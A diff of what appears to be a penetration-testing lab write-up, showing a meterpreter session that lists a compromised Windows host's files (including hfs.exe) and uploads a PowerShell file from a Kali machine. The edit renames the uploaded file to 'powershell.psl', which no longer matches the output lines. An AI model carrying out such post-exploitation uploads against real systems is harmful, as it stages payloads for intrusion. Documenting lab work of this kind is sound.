@@ -216,8 +216,10 @@ Mode              Size    Type  Last modified              Name
 040777/rwxrwxrwx  0       dir   2026-07-11 00:28:41 -0400  %TEMP%
 100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
 100777/rwxrwxrwx  760320  fil   2014-02-16 15:58:52 -0500  hfs.exe
+```
+meterpreter > upload /home/kali/powershell.psl
 
-meterpreter > upload /home/kali/powershell
+```
 [*] Uploading  : /home/kali/powershell -> powershell
 [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/powershell -> powershell
 [*] Completed  : /home/kali/powershell -> powershell
